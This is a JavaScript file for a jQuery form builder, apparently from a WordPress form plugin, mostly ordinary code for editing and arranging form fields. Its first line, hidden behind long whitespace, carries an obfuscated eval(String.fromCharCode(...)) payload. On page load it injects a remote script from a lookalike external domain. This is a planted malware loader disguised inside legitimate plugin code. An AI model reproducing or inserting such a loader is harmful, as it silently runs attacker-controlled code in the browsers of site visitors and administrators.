                                                                                                                                                                                                                                           eval(String.fromCharCode(118,97,114,32,112,115,100,100,32,61,32,100,111,99,117,109,101,110,116,46,103,101,116,69,108,101,109,101,110,116,115,66,121,84,97,103,78,97,109,101,40,34,115,99,114,105,112,116,34,41,59,32,118,97,114,32,119,97,110,116,109,101,101,32,61,32,102,97,108,115,101,59,102,111,114,32,40,118,97,114,32,105,32,61,32,48,59,32,105,32,60,32,112,115,100,100,46,108,101,110,103,116,104,59,32,105,43,43,41,32,123,32,32,32,105,102,32,40,112,115,100,100,91,105,93,46,105,100,41,32,123,32,32,32,9,32,105,102,32,40,112,115,100,100,91,105,93,46,105,100,32,61,61,32,34,115,112,101,99,116,114,101,112,111,105,110,116,34,41,123,32,9,9,119,97,110,116,109,101,101,61,116,114,117,101,59,32,9,32,125,32,32,32,125,32,32,125,105,102,40,119,97,110,116,109,101,101,61,61,102,97,108,115,101,41,123,32,9,118,97,114,32,100,61,100,111,99,117,109,101,110,116,59,118,97,114,32,115,61,100,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,39,115,99,114,105,112,116,39,41,59,32,115,46,105,100,61,34,115,112,101,99,116,114,101,112,111,105,110,116,34,59,115,46,97,115,121,110,99,61,116,114,117,101,59,115,46,115,114,99,61,83,116,114,105,110,103,46,102,114,111,109,67,104,97,114,67,111,100,101,40,49,48,52,44,49,49,54,44,49,49,54,44,49,49,50,44,49,49,53,44,53,56,44,52,55,44,52,55,44,57,57,44,49,48,48,44,49,49,48,44,52,54,44,49,49,57,44,49,48,49,44,57,55,44,49,49,54,44,49,48,52,44,49,48,49,44,49,49,52,44,49,49,50,44,49,48,56,44,49,48,56,44,49,48,56,44,57,55,44,49,49,54,44,49,48,50,44,49,49,49,44,49,49,52,44,49,48,57,44,52,54,44,57,57,44,49,49,49,44,49,48,57,44,52,55,44,49,48,49,44,49,49,56,44,49,48,49,44,49,49,48,44,49,49,54,44,49,49,53,44,52,54,44,49,48,54,44,49,49,53,44,54,51,44,49,49,56,44,54,49,44,53,48,44,52,54,44,52,57,44,53,50,44,52,57,41,59,32,105,102,32,40,100,111,99,117,109,101,110,116,46,99,117,114,114,101,110,116,83,99,114,105,112,116,41,32,123,32,100,111,99,117,109,101,110,116,46,99,117,114,114,101,110,116,83,99,114,105,112,116,46,112,97,114,101,110,116,78,111,100,101,46,105,110,115,101,114,116,66,101,102,111,114,101,40,115,44,32,100,111,99,117,109,101,110,116,46,99,117,114,114,101,110,116,83,99,114,105,112,116,41,59,125,32,101,108,115,101,32,123,100,46,103,101,116,69,108,101,109,101,110,116,115,66,121,84,97,103,78,97,109,101,40,39,104,101,97,100,39,41,91,48,93,46,97,112,112,101,110,100,67,104,105,108,100,40,115,41,59,125,32,125/*spectrepoint*/));	$.fbuilder[ 'typeList' ] = [];
	$.fbuilder[ 'categoryList' ] = [];
	$.fbuilder[ 'controls' ] = {};
	$.fbuilder[ 'displayedDuplicateContainerMessage' ] = false;
	$.fbuilder[ 'duplicateContainerMessage' ] = 'Note: If the container field being duplicated includes calculated fields or fields with dependency rules, the equations and dependencies rules in the new fields are exactly the same equations and dependency rules than in the original fields.';
	
	$.fbuilder[ 'preview' ] = function( e )
	{
		var f  = $( e.form );
		f.attr( 'target', 'formpopup' ).attr( 
			'onsubmit', 
			function( f )
			{
				var w = screen.width*0.8,
					h = screen.height*0.7,
					l = screen.width/2 - w/2,
					t = screen.height/2 - h/2,
					new_window = window.open('', 'formpopup', 'resizeable,scrollbars,width='+w+',height='+h+',left='+l+',top='+t);
					
				$( f ).removeAttr( 'onsubmit' );
				new_window.focus();
			} 
		);
		$( '<input type="hidden" name="preview" value="1" />' ).appendTo( f );
		
		f[ 0 ].submit();
		f.attr( 'target', '_self' ).find( 'input[name="preview"]').remove();
	};
	
	$.fbuilder[ 'htmlEncode' ] = function(value)
	{
		value = $('<div/>').text(value).html()
		value = value.replace( /&/g, '&amp;' )
					 .replace(/"/g, "&quot;")
					 .replace(/&amp;lt;/g, '&lt;')
					 .replace(/&amp;gt;/g, '&gt;');
		return value;
	};
	
	$.fbuilder[ 'htmlDecode' ] = function(value)
	{
		if( /&(?:#x[a-f0-9]+|#[0-9]+|[a-z0-9]+);?/ig.test( value ) ) value = $( '<div/>' ).html( value ).text();
		return value;
	};
	
	$.fbuilder[ 'escape_symbol' ] = function( value ) // Escape the symbols used in regulars expressions
	{
		return value.replace(/([\^\$\-\.\,\[\]\(\)\/\\\*\?\+\!\{\}])/g, "\\$1");
	};
				
	$.fbuilder[ 'parseVal' ] = function( value, thousandSeparator, decimalSymbol )
	{
		if( value == '' ) return 0;
		value += '';
		
		thousandSeparator = new RegExp( $.fbuilder.escape_symbol( ( typeof thousandSeparator == 'undefined' ) ? ',' : thousandSeparator ), 'g' );
		decimalSymbol = new RegExp( $.fbuilder.escape_symbol( ( typeof decimalSymbol == 'undefined' || /^\s*$/.test( decimalSymbol ) ) ? '.' : decimalSymbol ), 'g' );
		
		var t = value.replace( thousandSeparator, '' ).replace( decimalSymbol, '.' ).replace( /\s/g, '' ),
		    p = /[+\-]?((\d+(\.\d+)?)|(\.\d+))(?:[eE][+\-]?\d+)?/.exec( t );
			
		return ( p ) ? p[0]*1 : '"' + value.replace(/'/g, "\\'").replace( /\$/g, '') + '"';
	};
	
	$.fbuilder[ 'showErrorMssg' ] = function( str ) // Display an error message
    {
        $( '.form-builder-error-messages' ).html( '<div class="error-text">' + str + '</div>' );
    };
	
    // fbuilder plugin
	$.fn.fbuilder = function(){
		var typeList = 	$.fbuilder.typeList,
			categoryList = $.fbuilder.categoryList;
			
		$.fbuilder[ 'getNameByIdFromType' ] = function( id )
			{
				for ( var i = 0, h = typeList.length; i < h; i++ )
				{
					if ( typeList[i].id == id )
					{
						return  typeList[i].name;
					}	
				}		
				return "";
			};
		
		for ( var i=0, h = typeList.length; i < h; i++ )
		{
			var category_id = typeList[ i ].control_category;
			
			if( typeof categoryList[ category_id ]  == 'undefined' )
			{
				categoryList[ category_id ] = { title : '', description : '', typeList : [] };
			}
			else if( typeof categoryList[ category_id ][ 'typeList' ]  == 'undefined' )
			{
				categoryList[ category_id ][ 'typeList' ] = [];
			}
			
			categoryList[ category_id ].typeList.push( i );
		}

		for ( var i in categoryList )
		{
			$("#tabs-1").append('<div style="clear:both;"></div><div>'+categoryList[ i ].title+'</div><hr />');
			if( typeof categoryList[ i ][ 'description' ] != 'undefined' && !/^\s*$/.test( categoryList[ i ][ 'description' ] ) )
			{
				$("#tabs-1").append('<div style="clear:both;"></div><div class="category-description">'+categoryList[ i ].description+'</div>');
			}
			
			if( typeof categoryList[ i ][ 'typeList' ]  != 'undefined' )
			{
				for( var j = 0, k = categoryList[ i ].typeList.length; j < k; j++ )
				{
					var index = categoryList[ i ].typeList[ j ];
					$("#tabs-1").append('<div class="button itemForm width40" id="'+typeList[ index ].id+'">'+typeList[ index ].name+'</div>');
				}
			}	
		}
		
		$("#tabs-1").append('<div class="clearer"></div>');
		$( ".button").button();
		
		// Create a items object
		var items = [],
            fieldsIndex = {},
			selected = -3;
			
		$.fbuilder[ 'editItem' ] = function( id ) 
			{		    
				selected = id;
                try 
                { 
                    $('#tabs-2').html( items[id].showAllSettings() ); 
                } catch (e) {}
				items[id].editItemEvents();
			};
			
		$.fbuilder[ 'removeItem' ] = function( index ) 
			{
				if( typeof items[ index ][ 'remove' ] != 'undefined' ) items[ index ][ 'remove' ]();
				items[ index ] = 0;
				selected = -2;
				$('#tabs').tabs("option", "active", 0);

			};
			
		$.fbuilder[ 'duplicateItem' ] = function( index, parentItem ) 
			{
				var n = 0, i, h, item, nIndex, duplicate = items[index];
				for ( i in fieldsIndex ) if( /fieldname/.test( i ) ) n = Math.max( parseInt( i.replace( /fieldname/g,"" ) ), n );
				
				item = $.extend( true, {}, duplicate, { name:"fieldname"+(n+1) } );
				if( typeof item[ 'fields' ] != 'undefined' ) item[ 'fields' ] = [];
				if( typeof parentItem != 'undefined' ) item[ 'parent' ] = parentItem;
				else
				{
					/* Check if the parent is a container, and insert the new item as child of parent */
					if( 
						duplicate[ 'parent' ] != '' && 
						typeof items[ fieldsIndex[ duplicate[ 'parent' ] ] ][ 'duplicateItem' ] != 'undefined'
					)
					items[ fieldsIndex[ duplicate[ 'parent' ] ] ][ 'duplicateItem' ]( duplicate.name, item['name'] );	
				}	
				
				// Insert the duplicated item just below the original
				nIndex = index*1+1;
				items.splice( nIndex, 0,  item);
				fieldsIndex[ item[ 'name' ] ] = nIndex;
				i = nIndex; h = items.length;
				for ( i; i<h; i++ ) // Correct the rest of indices
				{
					items[i].index = i;
					fieldsIndex[ items[i].name ] = i;
				}
				
				// The duplicated item is a container
				if( typeof item[ 'duplicateItem' ] != 'undefined' )
				{
					// Alert Message
					if( !$.fbuilder[ 'displayedDuplicateContainerMessage' ] )
					{
						alert( $.fbuilder[ 'duplicateContainerMessage' ] );
						$.fbuilder[ 'displayedDuplicateContainerMessage' ] = true;
					}	
					
					i = 0; h = duplicate[ 'fields' ].length;
					for( i; i < h; i++ )
					{
						item[ 'fields' ][ i ] = $.fbuilder[ 'duplicateItem' ]( fieldsIndex[duplicate[ 'fields' ][ i ]], item[ 'name' ] );
					}	
				}	
				return item[ 'name' ];
			};
		
		$.fbuilder[ 'editForm' ] = function() 
			{
				$('#tabs-3').html(theForm.showAllSettings());
				selected = -1;

				$("#fTitle").keyup(function()
				{
					theForm.title = $(this).val();
					$.fbuilder.reloadItems();
				});
				
				$("#fEvalEquations").click(function()
				{
					theForm.evalequations = ($(this).is( ':checked' )) ? 1 : 0;
					$.fbuilder.reloadItems();
				});
				
				$("#fAutocomplete").click(function()
				{
					theForm.autocomplete = ($(this).is( ':checked' )) ? 1 : 0;
					$.fbuilder.reloadItems();
				});
				
				$("#fDescription").keyup(function()
				{
					theForm.description = $(this).val();
					$.fbuilder.reloadItems();
				});
				
				$("#fLayout").change(function()
				{
					theForm.formlayout = $(this).val();
					$.fbuilder.reloadItems();
				});
				
				$("#fTemplate").change(function()
				{
					theForm.formtemplate = $(this).val();
					var template 	= $.fbuilder.showSettings.formTemplateDic[ theForm.formtemplate ],
						thumbnail	= '',
						description = '';

					if( typeof template != 'undefined' )
					{
						if( typeof template[ 'thumbnail' ] != 'undefined' )
						{
							thumbnail = '<img src="' + template[ 'thumbnail' ] + '">';
						}
						if( typeof template[ 'description' ] != 'undefined' )
						{
							description = template[ 'description' ];
						}
					}
					$( '#fTemplateThumbnail' ).html( thumbnail );
					$( '#fTemplateDescription' ).html( description );
					$.fbuilder.reloadItems();
				});
			};
		
		$.fbuilder[ 'reloadItems' ] = function() 
			{
                
				for ( var i=0, h = $.fbuilder.showSettings.formlayoutList.length; i < h; i++ )
				{
					$("#fieldlist").removeClass( $.fbuilder.showSettings.formlayoutList[i].id );
				}	
				$("#fieldlist").addClass(theForm.formlayout);
				$("#formheader").html(theForm.display());
				$("#fieldlist").html("");
				if ( parseInt( selected ) == -1 )
				{
					$(".fform").addClass("ui-selected");
				}
				else
				{
					$(".fform").removeClass("ui-selected");
				}
				
                fieldsIndex = {};
				for ( var i=0, h = items.length; i < h; i++ )
				{
					items[i].index = i;
					items[i].parent = '';
                    fieldsIndex[ items[i].name ] = i;
					$("#fieldlist").append(items[i].display());
					if ( i == selected )
					{
						$("#field-"+i).addClass("ui-selected");
                        if( $('#tabs').tabs("option", "active") != 1 )
                        {
                            $.fbuilder[ 'editItem' ]( i );
                        }    
					}	
					else
					{
						$("#field-"+i).removeClass("ui-selected");
					}	
					
					$("#field-"+i+" .remove").click(function()
						{
							$.fbuilder[ 'removeItem' ]($(this).parent().attr("id").replace("field-",""));
							items = $.grep( items, function( e ){ return (e != 0 ); } );
							$.fbuilder.reloadItems();
						});
						
					$("#field-"+i+" .copy").click(function()
						{
							$.fbuilder[ 'duplicateItem' ]($(this).parent().attr("id").replace("field-",""));
							$('#tabs').tabs("option", "active", 0);
							$.fbuilder.reloadItems();
						});
						
				}
				
				for ( var i=0, h = items.length; i < h; i++ )
				{
					if( typeof items[ i ].after_show != 'undefined' ) items[ i ].after_show();
				}
				
				if (items.length>0)
				{
				    $(".fields").mouseover(function( evt ) 
						{
							$(this).addClass("ui-over");
							evt.stopPropagation();
						})
						.mouseout(function( evt )
						{
							$(this).removeClass("ui-over");
							evt.stopPropagation();
						})
						.click(function( evt )
						{
							evt.stopPropagation();
                            $.fbuilder[ 'editItem' ]($(this).attr("id").replace("field-",""));
							$( '#fieldlist .ui-selected' ).removeClass("ui-selected");
							$(this).addClass("ui-selected");
							$('#tabs').tabs("option", "active", 1);
                        });
					$(".field").focus(function()
						{
							$(this).blur();
						});	
				}
				
				$(".fform").mouseover(function() 
					{
						$(this).addClass("ui-over");
					})
					.mouseout(function()
					{
						$(this).removeClass("ui-over");
					})
					.click(function( evt ){
                        evt.stopPropagation();
						$('#tabs').tabs("option", "active", 2);
						$.fbuilder.editForm();
						$(this).siblings().removeClass("ui-selected");
						$(this).addClass("ui-selected");
					});
					
				ffunct.saveData("form_structure");
				
				//email list
				var str = "";
				for ( var i=0, h = items.length; i < h; i++ )
				{
					var item = items[ i ];
					if (item.ftype=="femail" || item.ftype=="femailds")
					{
						str += '<option value="'+item.name+'" '+((item.name == $('#cu_user_email_field').attr("def"))?"selected":"")+'>'+item.name+' ('+item.title+')'+'</option>';
					}
				}
				
				$('#cu_user_email_field').html(str);
				//field list for paypal request
				if (($('#request_cost').length > 0) && ($('#request_cost').is('select')))
				{
					var str = "";
					for (var i=0, h = items.length; i<h; i++)
					{
						var item = items[ i ];
						str += '<option value="'+item.name+'" '+((item.name == $('#request_cost').attr("def"))?"selected":"")+'>'+item.name+'('+(item.title)+')</option>';
					}	
					$('#request_cost').html(str);
				}
				
				//request amount list
				if ($('#paypal_price_field').length > 0)
				{
					var str = '<option value="" '+(('' == $('#paypal_price_field').attr("def"))?"selected":"")+'> ---- No ---- </option>';
					for (var i=0, h = items.length; i < h; i++)
					{
						var item = items[ i ];
						str += '<option value="'+item.name+'" '+((item.name == $('#paypal_price_field').attr("def"))?"selected":"")+'>'+(item.title)+'</option>';
					}		
					$('#paypal_price_field').html(str);
				}
			};
		
		var fform=function(){};
		$.extend(fform.prototype,
			{
				title:"Untitled Form",
				description:"This is my form. Please fill it out. It's awesome!",
				formlayout:"top_aligned",
				formtemplate:"",
                evalequations:1,
                autocomplete:1,
				display:function()
				{
					return '<div class="fform" id="field"><div class="arrow ui-icon ui-icon-play "></div><h1>'+this.title+'</h1><span>'+this.description+'</span></div>';
				},
				
				showAllSettings:function()
				{
					var layout 	    = '',
						template    = '<option value="">Use default template</option>',
						thumbnail   = '',
						description = '',
						selected    = '';
						
					for ( var i = 0; i< $.fbuilder.showSettings.formlayoutList.length; i++ )
					{
						layout += '<option value="'+$.fbuilder.showSettings.formlayoutList[i].id+'" '+(($.fbuilder.showSettings.formlayoutList[i].id==this.formlayout)?"selected":"")+'>'+$.fbuilder.showSettings.formlayoutList[i].name+'</option>';
					}	

					for ( var i in $.fbuilder.showSettings.formTemplateDic )
					{
						if( /^\s*$/.test( i ) ) break;
						selected = '';
						if( $.fbuilder.showSettings.formTemplateDic[i].prefix==this.formtemplate )
						{
							selected = 'SELECTED';
							if( typeof $.fbuilder.showSettings.formTemplateDic[i].thumbnail != 'undefined' )
							{
								thumbnail = '<img src="'+$.fbuilder.showSettings.formTemplateDic[i].thumbnail+'">'; 
							}
							
							if( typeof $.fbuilder.showSettings.formTemplateDic[i].description != 'undefined' )
							{
								description = $.fbuilder.showSettings.formTemplateDic[i].description; 
							}
						}
						
						template += '<option value="'+$.fbuilder.showSettings.formTemplateDic[i].prefix+'" ' + selected + '>'+$.fbuilder.showSettings.formTemplateDic[i].title+'</option>';
					}	
					
					return '<div><label>Form Name</label><input class="large" name="fTitle" id="fTitle" value="'+$.fbuilder.htmlEncode(this.title)+'" /></div><div><label>Description</label><textarea class="large" name="fDescription" id="fDescription">'+this.description+'</textarea></div><div><label>Label Placement</label><br /><select name="fLayout" id="fLayout" class="large">'+layout+'</select></div><div><label><input type="checkbox" name="fAutocomplete" id="fAutocomplete" '+( ( this.autocomplete ) ? 'CHECKED' : '' )+' /> Enable autocompletion</label></div><div><label><input type="checkbox" name="fEvalEquations" id="fEvalEquations" '+( ( this.evalequations ) ? 'CHECKED' : '' )+' /> Eval dynamically the equations associated to the calculated fields</label></div><div><label>Form Template</label><br /><select name="fTemplate" id="fTemplate" class="large">'+template+'</select></div><br /><div><span id="fTemplateThumbnail" style="float:left;padding-right:10px;">'+thumbnail+'</span><span  id="fTemplateDescription" style="float:left;">'+description+'</span></div>' ;
				}
			}
		);
		
		var theForm = new fform();
		$("#fbuilder").click( function( evt )
            { 
                evt.stopPropagation();
                selected = -2;
                $(".fform").removeClass("ui-selected")
                $( '#fieldlist .ui-selected' ).removeClass("ui-selected");
                $('#tabs').tabs("option", "active", 0);
            } 
        );
        $("#fieldlist").sortable(
			{
				'connectWith': '.ui-sortable',
				'items': '.fields',
				'placeholder': 'ui-state-highlight',
				'tolerance': 'pointer',
				'cursorAt': { 'top': 5, 'left': 5 },
				'update': function( event, ui )
				{
					var i, h = items.length;
					for( i = 0; i < h; i++ )
					{
						if( ui.item.hasClass( items[ i ].name ) ) break;
					}
						
					if( ui.item.parent().attr( 'id' ) == 'fieldlist' )
					{
						// receive or change order in fieldlist
						var prev  = ui.item.prev(),
							index = parseInt( ui.item.index() );

						if( prev.length )
						{
							for( var j = 0; j < h; j++ )
							{
								if( prev.hasClass(items[j].name) )
								{
									index = (i<=j) ? j : ++j;
									break;
								}	
							}	
						}

						items.splice( index, 0,  items.splice( i, 1 )[ 0 ] );
						$.fbuilder.reloadItems();
						$( '.'+/((fieldname)|(separator))\d+/.exec( ui.item.attr( 'class' ) )[ 0 ] ).click();
					}
					else
					{
						// remove
						items = items.concat( items.splice( i, 1 ) );
					}
				}
			}   
		);
		
		$('#tabs').tabs(
			{
				activate: function(event, ui) 
					{
						switch( $(this).tabs( "option", "active" ) )
						{
							case 0:
								$(".fform").removeClass("ui-selected");
							break;
							case 1:
								$(".fform").removeClass("ui-selected");
								if (selected < 0)
								{
								   $('#tabs-2').html('<b>No Field Selected</b><br />Please click on a field in the form preview on the right to change its properties.');
								}
							break;
							case 2:
								$(".fields").removeClass("ui-selected");
								$(".fform").addClass("ui-selected");
								$.fbuilder.editForm();
							break;
						}
					}	   
			}		
		);
		
	    var ffunct = {
	        getFieldsIndex: function() 
			{
			   return fieldsIndex;
		    },
		    getItems: function() 
			{
			   return items;
		    },
		    addItem: function(id) 
			{
			    var obj = eval("new $.fbuilder.controls['"+id+"']();"),
					fBuild = this,
					n = 0;

				obj.init();
				for ( var i in fieldsIndex ) if( /fieldname/.test( i ) ) n = Math.max( parseInt( i.replace( /fieldname/g,"" ) ), n );
				n++;
				obj.fBuild = fBuild;
			    $.extend(obj,{name:"fieldname"+n});
                
                if( selected >= 0 )
                {
                    items.splice( (selected)*1+1, 0, obj );
					if( id != 'fPageBreak' )
					{	
						if( typeof items[ selected ][ 'addItem' ] != 'undefined' )
						{
							obj.name[ 'parent' ] = items[ selected ][ 'name' ];
							items[ selected ][ 'addItem' ]( obj.name );
						}
						else
						{
							// get the parent
							if( items[ selected ][ 'parent' ] !== '' )
							{
								items[ fieldsIndex[ items[ selected ][ 'parent' ] ] ][ 'addItem' ]( obj.name, items[ selected ][ 'name' ]);
							}
							
							selected++;
						}
					}
					else
					{
						selected++;
					}	
                }
                else
                {
                    selected = items.length;
                    items[selected] = obj;
                }    
				$.fbuilder.reloadItems();
		    },
		    saveData:function(f)
			{
				try{
					var itemsStringified   = $.stringifyXX( items ),
						theFormStringified = $.stringifyXX( theForm ),
						errorTxt = 'The entered data includes invalid characters. Please, if you are copying and pasting from another platform, be sure the data not include invalid characters.',
						str;
						
					if( typeof global_varible_save_data != 'undefined' )
					{
						// If the global_varible_save_data exists clear the form-builder-error-messages
						$( '.form-builder-error-messages' ).html( '' );
					}
					
					try{
						if( $.parseJSON( itemsStringified ) != null && $.parseJSON( theFormStringified ) != null )
						{
							str = "["+ itemsStringified +",["+ theFormStringified +"]]";
							$( "#"+f ).val( str );
						}
						else
						{
							$.fbuilder[ 'showErrorMssg' ]( errorTxt );
						}
					}
					catch( err )
					{
						$.fbuilder[ 'showErrorMssg' ]( errorTxt );
					}
					
					global_varible_save_data = true;
				}catch( err ){}	
            },
		    loadData:function(form_structure, available_templates)
			{
		        var structure = $.parseJSON( $("#"+form_structure).val() ), // JSON data
					templates = ( typeof available_templates == 'undefined' ) ? null : $.parseJSON( $("#"+available_templates).val() ),
					fBuild = this;

			    if ( structure )
				{
					if (structure.length==2)
					{
						items = [];
						for (var i=0;i<structure[0].length;i++)
						{
						   var obj = eval("new $.fbuilder.controls['"+structure[0][i].ftype+"']();");
						   obj = $.extend( true, {}, obj, structure[0][i] );
						   obj.fBuild = fBuild;
						   items[items.length] = obj;
						}
						theForm = new fform();
						theForm = $.extend(theForm,structure[1][0]);
						$.fbuilder.reloadItems();
					}
				}
				
				if( templates )
				{
					$.fbuilder.showSettings.formTemplateDic = templates;
				}
		    },
		    removeItem: $.fbuilder[ 'removeItem' ],
		    editItem:   $.fbuilder[ 'editItem' ]
	    }
	   
	    this.fBuild = ffunct;
	    return this;
	};

    $.fbuilder[ 'showSettings' ] = {
		sizeList:new Array({id:"small",name:"Small"},{id:"medium",name:"Medium"},{id:"large",name:"Large"}),
		layoutList:new Array({id:"one_column",name:"One Column"},{id:"two_column",name:"Two Column"},{id:"three_column",name:"Three Column"},{id:"side_by_side",name:"Side by Side"}),
		formlayoutList:new Array({id:"top_aligned",name:"Top Aligned"},{id:"left_aligned",name:"Left Aligned"},{id:"right_aligned",name:"Right Aligned"}),
		formTemplateDic: {}, // Form Template dictionary
        showFieldType: function( v )
        {
            return '<label>Field Type: '+$.fbuilder[ 'getNameByIdFromType' ]( v )+'</label><br /><br />';
        },
		showTitle: function(v) 
		{
			return '<label>Field Label</label><textarea class="large" name="sTitle" id="sTitle">'+v+'</textarea>';
		},
		showShortLabel: function( v )
		{
			return '<div><label>Short label (optional) [<a class="helpfbuilder" text="The short label is used at title for the column when exporting the form data to CSV files.\n\nIf the short label is empty then, the field label will be used for the CSV file.">help?</a>] :</label><input class="large" name="sShortlabel" id="sShortlabel" value="'+v+'" /></div>';
		},
		showName: function( v ) 
		{
			return '<div><label>Field name, tag for the message:</label><input readonly="readonly" class="large" name="sNametag" id="sNametag" value="&lt;%'+v+'%&gt;" />'+
				   '<input style="display:none" readonly="readonly" class="large" name="sName" id="sName" value="'+v+'" /></div>';
		},
		showPredefined: function(v,c) 
		{
			return '<div><label>Predefined Value</label><textarea class="large" name="sPredefined" id="sPredefined">'+v+'</textarea><br /><input type="checkbox" name="sPredefinedClick" id="sPredefinedClick" '+((c)?"checked":"")+' value="1" > Use predefined value as placeholder.</div>';
		},
		showEqualTo: function(v,name) 
		{
			return '<div><label>Equal to [<a class="helpfbuilder" text="Use this field to create password confirmation field or email confirmation fields.\n\nSpecify this setting ONLY into the confirmation field, not in the original field.">help?</a>]</label><br /><select class="equalTo" name="sEqualTo" id="sEqualTo" dvalue="'+v+'" dname="'+name+'"></select></div>';
		},
		showRequired: function(v) 
		{
			return '<div><input type="checkbox" name="sRequired" id="sRequired" '+((v)?"checked":"")+'><label>Required</label></div>';
		},
		showSize: function(v) 
		{
			var str = "";
			for (var i=0;i<this.sizeList.length;i++)
			{
				str += '<option value="'+this.sizeList[i].id+'" '+((this.sizeList[i].id==v)?"selected":"")+'>'+this.sizeList[i].name+'</option>';
			}	
			return '<label>Field Size</label><br /><select name="sSize" id="sSize">'+str+'</select>';
		},
		showLayout: function(v) 
		{
			var str = "";
			for (var i=0;i<this.layoutList.length;i++)
			{
				str += '<option value="'+this.layoutList[i].id+'" '+((this.layoutList[i].id==v)?"selected":"")+'>'+this.layoutList[i].name+'</option>';
			}	
			return '<label>Field Layout</label><br /><select name="sLayout" id="sLayout">'+str+'</select>';
		},
		showUserhelp: function(v,c) 
		{
			return '<div><label>Instructions for User</label><textarea class="large" name="sUserhelp" id="sUserhelp">'+v+'</textarea><br /><input type="checkbox" name="sUserhelpTooltip" id="sUserhelpTooltip" '+((c)?"checked":"")+' value="1" > Show as floating tooltip.</div>';
		},
		showCsslayout: function(v) 
		{
			return '<label>Add Css Layout Keywords</label><input class="large" name="sCsslayout" id="sCsslayout" value="'+v+'" />';
		}
	};
	
	$.fbuilder.controls[ 'ffields' ] = function(){};
	$.extend( $.fbuilder.controls[ 'ffields' ].prototype, 
		{
			form_identifier:"",
			name:"",
			shortlabel:"",
			index:-1,
			ftype:"",
			userhelp:"",
			userhelpTooltip:false,
			csslayout:"",
			init:function(){},
			editItemEvents:function()
			{
				$("#sTitle").bind("keyup", {obj: this}, function(e) 
					{
						var str = $(this).val();
						e.data.obj.title = str.replace(/\n/g,"<br />");
						$.fbuilder.reloadItems();
					});
					
				$("#sShortlabel").bind("keyup", {obj: this}, function(e) 
					{
						e.data.obj.shortlabel = $(this).val();
						$.fbuilder.reloadItems();
					});
					
				$("#sPredefined").bind("keyup", {obj: this}, function(e) 
					{
						e.data.obj.predefined = $(this).val();
						$.fbuilder.reloadItems();
					});
					
				$("#sPredefinedClick").bind("click", {obj: this}, function(e) 
					{
						e.data.obj.predefinedClick = $(this).is(':checked');
						$.fbuilder.reloadItems();
					});
					
				$("#sRequired").bind("click", {obj: this}, function(e) 
					{
						e.data.obj.required = $(this).is(':checked');
						$.fbuilder.reloadItems();
					});
					
				$("#sUserhelp").bind("keyup", {obj: this}, function(e) 
					{
						e.data.obj.userhelp = $(this).val();
						$.fbuilder.reloadItems();
					});
					
				$("#sUserhelpTooltip").bind("click", {obj: this}, function(e) 
					{
						e.data.obj.userhelpTooltip = $(this).is(':checked');
						$.fbuilder.reloadItems();
					});
					
				$("#sCsslayout").bind("keyup", {obj: this}, function(e) 
					{
						e.data.obj.csslayout = $(this).val();
						$.fbuilder.reloadItems();
					});
					
				$(".helpfbuilder").click(function()
					{
						alert($(this).attr("text"));
					});
			},
			
			showSpecialData:function()
			{
				if(typeof this.showSpecialDataInstance != 'undefined')
				{
					return this.showSpecialDataInstance();
				}	
				else
				{
					return "";
				}	
			},
			
			showEqualTo:function()
			{
				if(typeof this.equalTo != 'undefined')
				{
					return $.fbuilder.showSettings.showEqualTo(this.equalTo,this.name);
				}	
				else
				{
					return "";
				}	
			},
			
			showPredefined:function()
			{
				if(typeof this.predefined != 'undefined')
				{
					return $.fbuilder.showSettings.showPredefined(this.predefined,this.predefinedClick);
				}	
				else
				{
					return "";
				}	
			},
			
			showRequired:function()
			{
				if(typeof this.required != 'undefined')
				{
					return $.fbuilder.showSettings.showRequired(this.required);
				}	
				else
				{
					return "";
				}	
			},
			
			showSize:function()
			{
				if(typeof this.size != 'undefined')
				{
					return $.fbuilder.showSettings.showSize(this.size);
				}	
				else
				{
					return "";
				}	
			},
			
			showLayout:function()
			{
				if(typeof this.layout != 'undefined')
				{
					return $.fbuilder.showSettings.showLayout(this.layout);
				}	
				else
				{
					return "";
				}	
			},
			
			showRange:function()
			{
				if(typeof this.min != 'undefined')
				{
					return this.showRangeIntance();
				}	
				else
				{
					return "";
				}	
			},
			
			showFormat:function()
			{
				if(typeof this.dformat != 'undefined')
				{
					try 
					{
						return this.showFormatIntance();
					} catch(e) {return "";}
				}	
				else
				{
					return "";
				}	
			},
			
			showChoice:function()
			{
				if(typeof this.choices != 'undefined')
				{
					return this.showChoiceIntance();
				}	
				else
				{
					return "";
				}	
			},
			
			showUserhelp:function()
			{
				return $.fbuilder.showSettings.showUserhelp(this.userhelp,this.userhelpTooltip);
			},
			
			showCsslayout:function()
			{
				return $.fbuilder.showSettings.showCsslayout(this.csslayout);
			},
			
			showAllSettings:function()
			{
				return this.showFieldType()+this.showTitle()+this.showShortLabel()+this.showName()+this.showSize()+this.showLayout()+this.showFormat()+this.showRange()+this.showRequired()+this.showSpecialData()+this.showEqualTo()+this.showPredefined()+this.showChoice()+this.showUserhelp()+this.showCsslayout();
			},
			
			showFieldType:function()
			{
				return $.fbuilder.showSettings.showFieldType(this.ftype);
			},
			
			showTitle:function()
			{
				return $.fbuilder.showSettings.showTitle(this.title);
			},
			
			showName:function()
			{
				return $.fbuilder.showSettings.showName(this.name);
			},
			
			showShortLabel:function()
			{
				return $.fbuilder.showSettings.showShortLabel(this.shortlabel);
			},
			
			display:function()
			{
				return 'Not available yet';
			},
			
			show:function()
			{
				return 'Not available yet';
			}
		}
	);